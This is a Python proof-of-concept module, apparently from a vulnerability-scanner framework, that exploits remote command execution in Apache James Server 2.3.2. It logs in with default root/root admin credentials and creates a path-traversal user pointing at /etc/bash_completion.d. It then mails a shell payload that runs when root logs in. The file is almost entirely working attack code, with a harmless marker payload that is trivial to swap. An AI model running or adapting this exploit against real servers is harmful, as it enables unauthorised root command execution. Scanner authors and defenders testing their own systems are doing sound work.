# coding: utf-8
import socket
import sys
import time
import urllib.parse

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ApacheJamesServer_0101'  # 平台漏洞编号
    name = 'Apache James Server 2.3.2 Authenticated User Remote Command Execution'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-10-16'  # 漏洞公布时间
    desc = '''
    Info: This exploit works on default installation of Apache James Server 2.3.2
    Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d.
    '''  # 漏洞描述
    ref = 'https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/Apache/Apache_James_Server_2.3.2-Remote_Command_Execution.py'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ApacheJamesServer'  # 漏洞组件名称
    product_version = '2.3.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fa8e5b43-a7a6-423d-841e-28f9c90472ad'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def recvAndsleep(self, s):
        s.recv(1024)
        time.sleep(0.2)

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            # to exploit only on root
            payload = '[ "$(id -u)" == "0" ] && touch /root/proof.txt'
            # credentials to James Remote Administration Tool (Default - root/root)
            user = 'root'
            pwd = 'root'
            target_parse = urllib.parse.urlparse(self.target)
            ip = socket.gethostbyname(target_parse.hostname)
            # self.output.info('[+]Connecting to James Remote Administration Tool...')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 4555))
            s.recv(1024)
            s.send(user + "\n")
            s.recv(1024)
            s.send(pwd + "\n")
            s.recv(1024)
            # self.output.info('"[+]Creating user..."')
            s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
            s.recv(1024)
            s.send("quit\n")
            s.close()
            # self.output.info('[+]Connecting to James SMTP server...')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 25))
            s.send("ehlo team@team.pl\r\n")
            self.recvAndsleep(s)
            # print "[+]Sending payload..."
            s.send("mail from: <'@team.pl>\r\n")
            self.recvAndsleep(s)
            # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
            s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
            self.recvAndsleep(s)
            s.send("data\r\n")
            self.recvAndsleep(s)
            s.send("From: team@team.pl\r\n")
            s.send("\r\n")
            s.send("'\n")
            s.send(payload + "\n")
            s.send("\r\n.\r\n")
            self.recvAndsleep(s)
            s.send("quit\r\n")
            self.recvAndsleep(s)
            s.close()
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
